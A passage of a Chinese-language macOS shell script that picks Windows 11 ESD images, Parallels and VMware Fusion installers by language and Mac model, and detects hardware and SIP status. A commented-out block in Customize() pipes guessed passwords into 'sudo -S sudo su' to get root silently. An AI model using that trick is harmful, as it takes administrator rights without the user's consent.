	SourceSHA1="356ebd300d4d076e53925401fc269956b213c31c"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/2d2010fa-3b12-4b28-be22-ec055586f61e/22000.318.211104-1236.co_release_svc_refresh_CLIENTBUSINESS_VOL_A64FRE_en-us.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	if [[ $lang = "" ]]; then
	SourceSHA1="cd564b66ff8b6ce5084ce86526068492295823ab"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/9e3f0205-5bdb-4416-b129-ade81c77be2d/22000.318.211104-1236.co_release_svc_refresh_CLIENTBUSINESS_VOL_A64FRE_zh-cn.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	else
	isoName="21H2Win11E"
	if [[ $lang = "ko" ]]; then
	SourceSHA1="d10f7b6cc29eb18d2b4b2bbe1f3c8f96c367c18a"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/d14857d7-8882-4da6-9839-22734ab06273/22000.318.211104-1236.co_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_ko-kr.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	if [[ $lang = "jp" ]]; then
	SourceSHA1="117ddd808ce83f6d7274618062bd50ff665b0eac"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/083f97e9-269f-4242-bbe4-591fcbf6f8fc/22000.318.211104-1236.co_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_ja-jp.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	if [[ $lang = "tw" ]]; then
	SourceSHA1="078c0708561bd7ca4c5ab232a59262c4319e8695"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/a283b1ca-1782-4225-9581-4bad8ec2ae2a/22000.318.211104-1236.co_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-tw.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	if [[ $lang = "en" ]]; then
	SourceSHA1="292b5b00d7981070eec423d0e8d648315a707f00"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/d0f44fc6-6053-4caf-b045-2d380a078ef0/22000.318.211104-1236.co_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_en-us.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	if [[ $lang = "" ]]; then
	SourceSHA1="63c95be8b543885e148d5b9e860a22dde6aef5f3"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/73bedbd0-f169-4f2b-82ea-e6fa078838d6/22000.318.211104-1236.co_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-cn.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	fi
    fi
    if [ "$aznum" = "2" ]; then 
	xnjaz="1"
	isoesd="1"
	if [ "$M1Yes" ]; then
	isoName="22H2AWin11E"
	if [[ $lang = "ko" ]]; then
	SourceSHA1="ef4fd92a8b53dbeb880855a795f033171d1e87c9"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/ffa63429-0e8b-4235-bb5a-c9436789b926/22621.525.220925-0207.ni_release_svc_refresh_CLIENTBUSINESS_VOL_A64FRE_ko-kr.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	if [[ $lang = "jp" ]]; then
	SourceSHA1="d6f41549d520d84633b67803c0ea646c867cbc56"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/53cd5a23-d07c-46cc-ac0c-fb62c7e3dde5/22621.525.220925-0207.ni_release_svc_refresh_CLIENTBUSINESS_VOL_A64FRE_ja-jp.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	if [[ $lang = "tw" ]]; then
	SourceSHA1="e15840ee19da5655015e3f672a40f0f037e96bcd"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/a2ec193f-fe59-4bed-9664-4341d20df4bc/22621.525.220925-0207.ni_release_svc_refresh_CLIENTBUSINESS_VOL_A64FRE_zh-tw.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	if [[ $lang = "en" ]]; then
	SourceSHA1="8a8c40d2c233f001f91d100883ec8d5006382cfe"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/2212df97-2889-4c66-b007-7f682c10cd60/22621.525.220925-0207.ni_release_svc_refresh_CLIENTBUSINESS_VOL_A64FRE_en-us.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	if [[ $lang = "" ]]; then
	SourceSHA1="22db36e22149313a41dcc6a6bdd2c471835910f1"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/5ae18679-73d4-4456-89b4-fd9e32d1fc92/22621.525.220925-0207.ni_release_svc_refresh_CLIENTBUSINESS_VOL_A64FRE_zh-cn.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	else
	isoName="22H2Win11E"
	if [[ $lang = "ko" ]]; then
	SourceSHA1="79c42da86ca636c08d6997a9458253b07dda2fbb"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/ee9d4377-27d3-4ae8-bad4-ed1aada12860/22621.525.220925-0207.ni_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_ko-kr.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	if [[ $lang = "jp" ]]; then
	SourceSHA1="d35ed22a1c5ae3d5702cadb3a9f359788cbdd6be"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/f3379c92-1eff-4a43-9cec-cb5daed30c67/22621.525.220925-0207.ni_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_ja-jp.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	if [[ $lang = "tw" ]]; then
	SourceSHA1="f4a66aca64c586ba18e7be6950484a92359ace8e"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/78f0d040-ea27-4251-9381-3fd97f32956a/22621.525.220925-0207.ni_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-tw.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	if [[ $lang = "en" ]]; then
	SourceSHA1="f1209f2ffdd839c325852cdeacb09014a31e0a44"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/6b90885c-6e27-459f-b4ad-e717bcdaf7fc/22621.525.220925-0207.ni_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_en-us.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	if [[ $lang = "" ]]; then
	SourceSHA1="8a8bd8df94f11b350abb0639662e8956fc3ac885"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/c1dd582c-68cb-4c22-8926-637352b88992/22621.525.220925-0207.ni_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-cn.esd"
	name=${url##*/}
	xtname=${url##*/}
	fi
	fi
	fi
if [ "$aznum" = "3" ]; then 
xnjaz="1"
if [ "$M1Yes" ]; then
uups="1"
isoName="21H2AWin11U"
url3="https://uup.rg-adguard.net/api/GetFiles?id=c243cd1c-0107-4ac6-b9d7-7dbdc88022c2&lang="$lang3"&edition=professional&txt=yes"
else
uups="1"
isoName="21H2Win11U"
url3="https://uup.rg-adguard.net/api/GetFiles?id=6501e74d-5a5e-40fb-8032-b49aa6d779f4&lang="$lang3"&edition=professional&txt=yes"
fi
fi
if [ "$aznum" = "4" ]; then 
xnjaz="1"
if [ "$M1Yes" ]; then
uups="1"
isoName="22H2AWin11U"
url3="https://uup.rg-adguard.net/api/GetFiles?id=7fa6ae23-f220-4085-b6c0-5d6a27e52bbe&lang="$lang3"&edition=professional&txt=yes"
else
uups="1"
isoName="22H2Win11U"
url3="https://uup.rg-adguard.net/api/GetFiles?id=23665cc3-1efb-4a79-a29f-d370e8d043fe&lang="$lang3"&edition=professional&txt=yes"
fi
   fi
if [ "$aznum" = "5" ]; then 
xnjaz="1"
if [ "$M1Yes" ]; then
uups="1"
isoName="23H2AWin11U"
url3="https://uup.rg-adguard.net/api/GetFiles?id=be28649e-9a04-4404-81d7-72b348d8efe1&lang="$lang3"&edition=professional&txt=yes"
else
uups="1"
isoName="23H2Win11U"
url3="https://uup.rg-adguard.net/api/GetFiles?id=90703ffa-2239-49c4-8c5c-7d9ffe9aa0d3&lang="$lang3"&edition=professional&txt=yes"
fi
   fi
if [ "$zdpdbb" = "18" ]; then
pdbb="18"
pd18sq="1"
name2="ParallelsDesktop-18.0.1-53056.dmg"
url2="https://download.parallels.com/desktop/v18/18.0.1-53056/ParallelsDesktop-18.0.1-53056.dmg"
fi
if [ "$zdpdbb" = "17" ]; then
pdbb="17"
pd17sq="1"
name2="ParallelsDesktop-17.1.2-51548.dmg"
url2="https://download.parallels.com/desktop/v17/17.1.2-51548/ParallelsDesktop-17.1.2-51548.dmg"
fi
if [ "$zdpdbb" = "16" ]; then
pdbb="17"
pd16sq="1"
if [ "$M1Yes" ]; then
name2="ParallelsDesktop-16.5.1-50696.dmg"
url2="https://download.parallels.com/desktop/v16/16.5.1-50696/ParallelsDesktop-16.5.1-50696.dmg"
else
name2="ParallelsDesktop-16.5.0-49183.dmg"
url2="https://download.parallels.com/desktop/v16/16.5.0-49183/ParallelsDesktop-16.5.0-49183.dmg"
fi
fi


if [ "$kqazvm" ]; then
azvmxnj="1"
pdbb=""
pd16sq=""
pd17sq=""
pd18sq=""
if [ "$M1Yes" ]; then
isovm="1"
fi
    if [ "$vmbb" = "13.0.1" ]; then
	name2="VMware-Fusion-13.0.1-21139760_universal.dmg"
	url2="https://download3.vmware.com/software/FUS-1301/VMware-Fusion-13.0.1-21139760_universal.dmg"
	fi
	if [ "$vmbb" = "12.2.5" ]; then
	name2="VMware-Fusion-12.2.5-20904517_x86.dmg"
	url2="https://download3.vmware.com/software/FUS-1225/VMware-Fusion-12.2.5-20904517_x86.dmg"
	fi
    if [ "$vmbb" = "12.2.4" ]; then
	name2="VMware-Fusion-12.2.4-20071091_x86.dmg"
	url2="https://download3.vmware.com/software/FUS-1224/VMware-Fusion-12.2.4-20071091_x86.dmg"
	fi
    if [ "$vmbb" = "12.2.3" ]; then
	name2="VMware-Fusion-12.2.3-19436697_x86.dmg"
	url2="https://download3.vmware.com/software/FUS-1223-New/VMware-Fusion-12.2.3-19436697_x86.dmg"
	fi
	if [ "$vmbb" = "12.1.2" ]; then
	name2="VMware-Fusion-12.1.2-17964953.dmg"
	url2="https://download3.vmware.com/software/fusion/file/VMware-Fusion-12.1.2-17964953.dmg"
	fi
	if [ "$vmbb" = "11.5.7" ]; then
	name2="VMware-Fusion-11.5.7-17130923.dmg"
	url2="https://download3.vmware.com/software/fusion/file/VMware-Fusion-11.5.7-17130923.dmg"
	fi
	if [ "$vmbb" = "11.5.3" ]; then
	name2="VMware-Fusion-11.5.3-15870345.dmg"
	url2="https://download3.vmware.com/software/fusion/file/VMware-Fusion-11.5.3-15870345.dmg"
	fi
	if [ "$vmbb" = "11.1.1" ]; then
	name2="VMware-Fusion-11.1.1-14328561.dmg"
	url2="https://download3.vmware.com/software/fusion/file/VMware-Fusion-11.1.1-14328561.dmg"
	fi
	if [ "$vmbb" = "10.1.6" ]; then
	name2="VMware-Fusion-10.1.6-12989998.dmg"
	url2="https://download3.vmware.com/software/fusion/file/VMware-Fusion-10.1.6-12989998.dmg"
	fi
	if [ "$vmbb" = "8.5.10" ]; then
	name2="VMware-Fusion-8.5.10-7527438.dmg"
	url2="https://download3.vmware.com/software/fusion/file/VMware-Fusion-8.5.10-7527438.dmg"
	fi
rm -rf ~/Downloads/JG_Download/ParallelsDesktop*.dmg >/dev/null 2>&1
fi

if [ "$uups" ]; then
url="$url2"
name="$name2"
url2=""
name2=""
fi

if [ ! "$uups" ]; then
if [ ! "$xnjaz" ]; then
Virtual
fi	
fi

AZPKG
	;;	
	x)
	clear
	Start_menu
	;;
	0)
	clear
	Start_menu
	;;
	*)
	clear
	echo  "\033[31m"
	read -s -n1 -p "输入错误！请输入正确的选项！请按任意键返回重新输入... "
	echo  "\033[0m"
	Virtual
	;;
esac
}


Customize(){
#passwrd=`echo 1234 | sudo -S sudo su`
#if [ $? -eq 1 ] ; then
#passwrd=`echo 1 | sudo -S sudo su`
#else
#pass="1234"
#fi
#if [ $? -eq 1 ] ; then
#passwrd=`echo 123 | sudo -S sudo su`
#else
#pass="1"
#fi
#if [ $? -eq 1 ] ; then
#pass=""
#else
#pass="123"
#fi		
clear && printf "\e[3J"
guid=$(diskutil list disk0 | grep "GUID")
if [ ! "$guid" ]; then
clear && printf "\e[3J"
echo	
echo
echo
echo
read -s -n1 -p "检查到分区表不是GUID, 无法安装！！！"
echo
fi
yhid="$(id -un)" 
if groups $yhid | grep -q -w admin; then 
echo 
else 
echo
echo
echo
echo "  ""\033[42;30m 当前用户不是管理员, 无法安装！！！\033[0m"
echo
echo
echo
read -s -n1 -p " "
fi
if [ "$Battery" ]; then
if [[ $batterystatus == discharging ]] ; then 
if [ "${Battery:0:1}" -lt 3 ]; then
clear && printf "\e[3J"
echo	
echo
echo
read -s -n1 -p "注意！电量低于30%"
echo
fi
fi
fi
if [ "$[RANDOM%3]" = "0" ]; then
ip="http://"$xnjip":5244/d/123"
fi
if [ "$[RANDOM%3]" = "1" ]; then
ip="http://"$xnjip":5244/d/aly"
fi
if [ "$[RANDOM%3]" = "2" ]; then
#ip="http://"$xnjip":5244/d/139"
ip="http://"$xnjip":5244/d/aly2"
fi
clear && printf "\e[3J"
if [ ! -f /tmp/pzxx.sh ] ; then
modelcpu="$(sysctl machdep.cpu.brand_string 2>/dev/null|awk '/machdep.cpu.brand_string:/ {print $2,$3,$4,$5,$6,$7,$8,$9}')"
memtotal="$(($(sysctl -n hw.memsize) / 1024 / 1024/ 1024))"	
modelid="$(system_profiler SPDisplaysDataType SPMemoryDataType SPStorageDataType | grep 'Graphics/Displays:\|Chipset Model:\|VRAM (Total):\|Resolution:\|Memory Slots:\|Size:\|Speed:\|Storage:\|Media Name:\|Medium Type:' 2>/dev/null|awk '/Chipset Model:/ {print $3,$4,$5,$6,$7,$8,$9}')"
modelxh="$(sw_vers 2>/dev/null|awk '/ProductVersion:/ {print $NR}')"	
modelbb="$(system_profiler SPHardwareDataType 2>/dev/null|awk '/Model Identifier:/ {print $NF}')"
model512="$(diskutil info disk0 2>/dev/null|awk '/Device Block Size:/ {print $4,$5}')"
modelssd="$(system_profiler SPStorageDataType 2>/dev/null|awk '/Medium Type:/ {print $3}')"
srsyb="$(system_profiler SPStorageDataType | grep "APPLE SSD")"
imachdd="$(system_profiler SPStorageDataType | grep "APPLE HDD")"


if [ ! "$srsyb" ]; then
srsyb="$(system_profiler SPStorageDataType | grep "APPLE HDD")"
if [ ! "$imachdd" ]; then
imachdd="1"
fi
fi


else
source /tmp/pzxx.sh
fi

disk_total="$(df -h | head -2 | tail -1 | awk '{print $2}' | sed 's/i/B/g')[总]"
disk_used="$(df -h | head -2 | tail -1 | awk '{print $4}' | sed 's/i/B/g')[可用]"
Disk="$disk_used / $disk_total"
kykj="$(df -h | head -2 | tail -1 | awk '{print $4}' | sed 's/[^0-9]//g')"
zkj="$(df -h | head -2 | tail -1 | awk '{print $2}' | sed 's/[^0-9]//g')"

tarbc="1"

if [ "$zxos" ]; then
diskcc="3"
zdcq13="1"
fi
if [[ $modelxh = "12."* ]]; then
diskcc="3"
#tarbc="1"
fi
if [[ $modelxh = "11."* ]]; then
diskcc="3"
fi
if [[ $modelxh = "10.15"* ]]; then
diskcc="3"
fi
if [[ $modelxh = "10.14"* ]]; then
diskcc="3"
fi
if [[ $modelxh = "10.13"* ]]; then
diskcc="3"
imacpd="1"
fi
if [[ $modelxh = "10.12"* ]]; then
diskcc="4"
imacpd="1"
fi
if [[ $modelxh = "10.11"* ]]; then
diskcc="4"
imacpd="1"
fi
if [[ $modelxh = "10.10"* ]]; then
diskcc="4"
imacpd="1"
fi
if [[ $modelxh = "10.9"* ]]; then
diskcc="4"
fi
if [[ $modelxh = "10.8"* ]]; then
diskcc="4"
fi
if [[ $modelxh = "10.7"* ]]; then
diskcc="4"
fi
if [[ $modelxh = "10.6"* ]]; then
diskcc="4"
fi
winfq=$(diskutil list | grep 'Microsoft Basic Data' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
#if [ "$zkj" = "111" ] || [ "$zkj" = "112" ] || [ "$zkj" = "113" ] || [ "$zkj" = "224" ] || [ "$zkj" = "232" ] || [ "$zkj" = "233" ] || [ "$zkj" = "234" ] || [ "$zkj" = "465" ] || [ "$zkj" = "466" ] || [ "$zkj" = "926" ] || [ "$zkj" = "931" ] || [ "$zkj" = "932" ] || [ "$zkj" = "933" ]; then
#wfq="1"
#fi

if [ ! "$winfq" ]; then
macfq=$(diskutil list | grep disk0s"$diskcc")
fi


if [ ! "$M1CPU" ]; then

if [ ! "$winfq" ]; then

if [ "$macfq" ]; then
osascript -e 'quit app"Disk Utility"'
open /System/Applications/Utilities/Disk\ Utility.app 	
open /Applications/Utilities/Disk\ Utility.app
	clear && printf "\e[3J"
	echo	
fi
fi
fi

if [ ! -f /tmp/pzxx.sh ] ; then
echo "#!/bin/sh" > /tmp/pzxx.sh
echo "modelcpu='$modelcpu'" >> /tmp/pzxx.sh
echo "memtotal='$memtotal'" >> /tmp/pzxx.sh
echo "modelid='$modelid'" >> /tmp/pzxx.sh
echo "modelxh='$modelxh'" >> /tmp/pzxx.sh
echo "modelbb='$modelbb'" >> /tmp/pzxx.sh
echo "model512='$model512'" >> /tmp/pzxx.sh
echo "modelssd='$modelssd'" >> /tmp/pzxx.sh
echo "srsyb='$srsyb'" >> /tmp/pzxx.sh
echo "imachdd='$imachdd'" >> /tmp/pzxx.sh
fi
gtp=$(echo "$modelssd" | grep "SSD")

clear && printf "\e[3J"	
echo
echo ID: "\033[36m${tbid}\033[0m"		
echo
echo "本机 CPU：${modelcpu}"	
echo "本机内存：${memtotal} GB"
echo "本机显卡："${modelid}""

	
	if [ ! "$gtp" ]; then
		
		echo "磁盘类型：非固态" "${model512}"
		yphdd="HDD"
	else
		
		echo "磁盘类型：固态" "${model512}"
	fi

	echo "磁盘空间：${Disk}" 
	

	
		echo "系统版本：${modelxh}" 
		

		

		
		if [ "$srsyb" ]; then
		echo "硬盘型号：原装"
	    else
		echo "硬盘型号：非原装"
		fi
		
		if [ ! "$srsyb" ]; then
		pcissd="$(system_profiler SPStorageDataType | grep "Protocol: PCI")"
		fi


if [[ $modelxh = "10.9"* ]]; then
		echo "SIP 状态：无需检查"		
sip=""
else

if [[ $modelxh = "10.8"* ]]; then
		echo "SIP 状态：无需检查"		
sip=""

else

if [[ $modelxh = "10.7"* ]]; then
		echo "SIP 状态：无需检查"		
sip=""

else

if [[ $modelxh = "10.6"* ]]; then
		echo "SIP 状态：无需检查"		
sip=""

else

if [[ $modelxh = "10.10"* ]]; then
		echo "SIP 状态：无需检查"
		sip=""

else

	if [[ $(csrutil status 2>/dev/null|awk '/status:/ {print $NF}') = *"disabled"* ]]; then
		echo "SIP 状态：关闭"
	else
		sip="1"
	if [[ $(csrutil status|grep "Apple Internal: disabled") = *"disabled"* ]]; then	
        sip=""
        echo "SIP 状态：关闭"
        else
        echo "SIP 状态：开启"
    fi
	fi
	fi
	fi
	fi
	fi
	fi
	
	if [ "$sysyy" = "" ]; then
		echo "系统语言：简体"
	fi
	
	if [ "$sysyy" = "en" ]; then
		echo "系统语言：\033[36m英语\033[0m"
	fi
	
	if [ "$sysyy" = "tw" ]; then
		echo "系统语言：\033[35m繁体\033[0m"
	fi
	
	if [ "$sysyy" = "ko" ]; then
		echo "系统语言：\033[34m韩语\033[0m"
	fi		
	
	if [ "$sysyy" = "jp" ]; then
		echo "系统语言：\033[33m日语\033[0m"
	fi
			

		echo "下载线路：${zjxx}"


if [[ $modelbb = *"Parallels14,1"* ]]; then
		echo
		dnjx="PD虚拟机"
		#NoWin7="1"
		wzhfxt="6136"
		wzhfxt7="4034"
		wzhfxt732="4036"
	fi	


if [[ $modelbb = "Mac14,12" ]]; then
NoWin7="1"
M1Yes="1"
echo
dnjx="M2-23Mini"
fi

if [[ $modelbb = "Mac14,3" ]]; then
NoWin7="1"
M1Yes="1"
echo
dnjx="M2-23Mini"
fi


if [[ $modelbb = "Mac14,10" ]]; then
NoWin7="1"
M1Yes="1"
echo
dnjx="M2-16寸-23Pro"
fi

if [[ $modelbb = "Mac14,6" ]]; then
NoWin7="1"
M1Yes="1"
echo
dnjx="M2-16寸-23Pro"
fi

if [[ $modelbb = "Mac14,9" ]]; then
NoWin7="1"
M1Yes="1"
echo
dnjx="M2-14寸-23Pro"
fi
	
if [[ $modelbb = "Mac14,5" ]]; then
NoWin7="1"
M1Yes="1"
echo
dnjx="M2-14寸-23Pro"
fi
	
if [[ $modelbb = "Mac14,7" ]]; then
NoWin7="1"
M1Yes="1"
echo
dnjx="M2-13寸-22Pro"
fi

if [[ $modelbb = "Mac14,2" ]]; then
NoWin7="1"
M1Yes="1"
echo
dnjx="M2-13寸-22Air"
fi
	
if [[ $modelbb = "Mac13,1" ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="Mac-Studio-2022"
	
	fi
if [[ $modelbb = "Mac13,2" ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="Mac-Studio-2022"
	
	fi		
if [[ $modelbb = *"Macmini9,1"* ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="M1-Mini"
	
	fi
	
if [[ $modelbb = *"MacBookPro17,1"* ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="M1-13寸-20Pro"
		
	fi
	
if [[ $modelbb = *"MacBookPro18,1"* ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="M1-16寸-21Pro"
		
fi	
	
if [[ $modelbb = *"MacBookPro18,2"* ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="M1-16寸-21Pro"
		
	fi
if [[ $modelbb = *"MacBookPro18,3"* ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="M1-14寸-21Pro"
		
fi	
if [[ $modelbb = *"MacBookPro18,4"* ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="M1-14寸-21Pro"
		
fi		
if [[ $modelbb = *"iMac21,1"* ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="M1-24寸-21iMac"
	fi
	
if [[ $modelbb = *"iMac21,2"* ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="M1-24寸-21iMac"
	fi	
	
if [[ $modelbb = *"MacBookAir10,1"* ]]; then
NoWin7="1"
M1Yes="1"
		echo
		dnjx="M1-13寸-20Air"
	fi
	

if [[ $modelbb = "Xserve1,1" ]]; then
		echo
		dnjx="06Xserve"
		Win732="1"
		zzc32="1"
		zgmac="10.7"
		dnos="10.7.5"
	fi

if [[ $modelbb = "Xserve2,1" ]]; then
		echo
		dnjx="08Xserve"
		Win732="1"
		zgmac="10.7"
		dnos="10.7.5"
	fi

if [[ $modelbb = "Xserve3,1" ]]; then
		echo
		dnjx="09Xserve"
		Win732="1"
		zgmac="10.11"		
		dnos="10.11.6"
	fi
		
if [[ $modelbb = "MacPro1,1" ]]; then
		echo
		dnjx="06MacPro"
		Win732="1"
		zzc32="1"
		zgmac="10.7"
		dnos="10.7.5"
	fi	
	
if [[ $modelbb = "MacPro2,1" ]]; then
		echo
		dnjx="07MacPro"
		Win732="1"
		zzc32="1"
		zgmac="10.7"
		dnos="10.7.5"
	fi
		
if [[ $modelbb = "MacPro3,1" ]]; then
		echo
		dnjx="08MacPro"
		zgmac="10.11"
		dnos="10.11.6"
	fi	
	
	
if [[ $modelbb = *"MacPro4,1"* ]]; then
btap="5.1.5621"
oldsz="1"
MBR10="1"
kyqs15="1"
win10sip="1"
		echo
		dnjx="09MacPro"
		dnos="10.11.6"	
	fi
	
if [[ $modelbb = *"MacPro5,1"* ]]; then
btap="5.1.5621"
oldsz="1"
No732="1"
win10sip="1"
wzhfxt="6135"
MBR10="1"
kyqs15="1"
		echo
		dnjx="10/12MacPro"
		dnos="10.12.6"		
	fi
		
if [[ $modelbb = *"MacPro6,1"* ]]; then
btap="5.1.5640"
wzhfxt="6136"
		echo
		dnjx="13MacPro"
		dnos="12.x.x"
	fi
		
if [[ $modelbb = *"MacPro7,1"* ]]; then
T2XP="1"
wzhfxt="7667"
		echo
		dnjx="19MacPro"
	fi
		

						
		if [[ $modelbb = *"MacBookAir9,1"* ]]; then
		NoWin7="1"
		T2XP="1"
		bt7="1"
		wzhfxt="7854"
		echo
		dnjx="13寸-20Air"
		
	fi
	
			if [[ $modelbb = *"MacBookAir8,2"* ]]; then
			NoWin7="1"
			T2XP="1"
			bt7="1"
			zdbt="18air"
			wzhfxt="7242"
			wzwim="1"
		echo
		dnjx="13寸-19Air"
		
	fi
	
				if [[ $modelbb = *"MacBookAir8,1"* ]]; then
				NoWin7="1"
				T2XP="1"
				bt7="1"
				zdbt="18air"
				wzhfxt="7242"
				wzwim="1"
		echo
		dnjx="13寸-18Air"
		
	fi
	
					if [[ $modelbb = *"MacBookAir7,2"* ]]; then
					btap="15EFI"
					NoWin7="1"
					zgmac="12.0"
					wzhfxt="6136"
				    if [ "$pcissd" ]; then
					wzhfxt="6137"
					fi
					if [[ $model512 = "4096 Bytes" ]]; then
					wzhfxt="6138"
			     	fi
		echo
		dnjx="13寸-15/17Air"
		dnos="12.x.x"		
	fi
	
					if [[ $modelbb = *"MacBookAir7,1"* ]]; then
					NoWin7="1"
					zgmac="12.0"
					wzhfxt="6138"
					if [ "$pcissd" ]; then
					wzhfxt="6137"
					fi
					if [[ $model512 = "512 Bytes" ]]; then
					wzhfxt="6136"
			     	fi
		echo
		dnjx="11寸-15Air"
		dnos="12.x.x"		
	fi
	
						if [[ $modelbb = *"MacBookAir6,2"* ]]; then
						btap="5.1.5640"
						zgmac="11.0"
						No732="1"
						wzhfxt="6136"
						wzhfxt7="5640"
		echo
		dnjx="13寸-13中/14初Air"
		dnos="11.x.x"
		
	fi
	
						if [[ $modelbb = *"MacBookAir6,1"* ]]; then
						btap="5.1.5640"
						zgmac="11.0"
						No732="1"
						wzhfxt="6136"
						wzhfxt7="5640"
		echo
		dnjx="11寸-13中/14初Air"
		dnos="11.x.x"
		
	fi
	
						if [[ $modelbb = *"MacBookAir5,2"* ]]; then
						btap="4.0.4326"
						if [ "$sip" ]; then
						asip="1"
                        w10btap="2012Air"
	                    else
	                    w10btap="6.0.6136"
                        fi
						win10sip="1"
						zgmac="10.15"
						MBR10="1"
						oldsz="1"
						wzhfxt="6135"
						wzhfxt7="5621"
						wzhfxt732="4036"
		echo
		dnjx="13寸-12Air中"
		dnos="10.15.7"
		
	fi
	
						if [[ $modelbb = *"MacBookAir5,1"* ]]; then
						btap="4.0.4326"
						if [ "$sip" ]; then
						asip="1"
                        w10btap="2012Air"
	                    else
	                    w10btap="6.0.6136"
                        fi
                        win10sip="1"
                        zgmac="10.15"
                        MBR10="1"
                        oldsz="1"
                        wzhfxt="6135"
                        wzhfxt7="5621"
                        wzhfxt732="4036"
		echo
		dnjx="11寸-12Air中"
		dnos="10.15.7"
		
	fi
		
						if [[ $modelbb = *"MacBookAir4,2"* ]]; then
						btap="4.0.4131"
						win10sip="1"
						zgmac="10.13"
						MBR10="1"
						kyqs15="1"
						wzhfxt="6135"
						wzhfxt7="5623"
						wzhfxt732="4036"
						if [ "$sip" ]; then
						asip="1"
						fi
		echo
		dnjx="13寸-11Air中"
		dnos="10.13.6"
		
	fi
		
						if [[ $modelbb = *"MacBookAir4,1"* ]]; then
						btap="4.0.4131"
						win10sip="1"
						zgmac="10.13"
						MBR10="1"
						kyqs15="1"
						wzhfxt="6135"
						wzhfxt7="5623"
						wzhfxt732="4036"
						if [ "$sip" ]; then
						asip="1"
						fi
		echo
		dnjx="11寸-11Air中"
		dnos="10.13.6"
		
	fi
			
						if [[ $modelbb = *"MacBookAir3,2"* ]]; then
						zgmac="10.13"
						MBR10="1"
						kyqs15="1"
						win10sip="1"
						wzhfxt7="4034"
						wzhfxt732="4036"
						if [ "$sip" ]; then
						asip="1"
						fi
		echo
		dnjx="13寸-10Air"
		dnos="10.13.6"
		
	fi
				
						if [[ $modelbb = *"MacBookAir3,1"* ]]; then
						zgmac="10.13"
						MBR10="1"
						kyqs15="1"
						win10sip="1"
						wzhfxt7="4034"
						wzhfxt732="4036"
						if [ "$sip" ]; then
						asip="1"
						fi
		echo
		dnjx="11寸-10Air"
		dnos="10.13.6"
		
	fi
					
						if [[ $modelbb = *"MacBookAir2,1"* ]]; then
						zgmac="10.11"
						MBR10="1"
						kyqs15="1"
						win10sip="1"
						Win732="1"
						wzhfxt7="4034"
						wzhfxt732="4036"
						if [ "$sip" ]; then
						asip="1"
						fi
		echo
		dnjx="13寸-09Air"
		dnos="10.11.6"
		
	fi
						
						if [[ $modelbb = *"MacBookAir1,1"* ]]; then
						zgmac="10.7"
						MBR10="1"
						Win732="1"
						wzhfxt7="4034"
						wzhfxt732="4036"
						zzc32="1"
		echo
		dnjx="13寸-08Air"
		dnos="10.7.5"
		
	fi						
						if [[ $modelbb = *"MacBook10,1"* ]]; then
						NoWin7="1"
						lanya="1"
						wzhfxt="6813"
						wzwim="1"
						sdqh="1"
		echo
		dnjx="17MacBook"
		dnos="13.x.x"
	fi
							if [[ $modelbb = *"MacBook9,1"* ]]; then
							NoWin7="1"
							EFI8="1"
							zgmac="12.0"
							wzhfxt="6471"
							zmaz="1"
		echo
		dnjx="16MacBook"
		dnos="12.x.x"		
	fi
								if [[ $modelbb = *"MacBook8,1"* ]]; then
								NoWin7="1"
								zgmac="11.0"
								EFI8="1"
								wzhfxt="6138"
								zmaz="1"
							    if [[ $model512 = "512 Bytes" ]]; then
					            wzhfxt="6136"
			     	            fi
		echo
		dnjx="15MacBook"
		dnos="11.x.x"
		
	fi
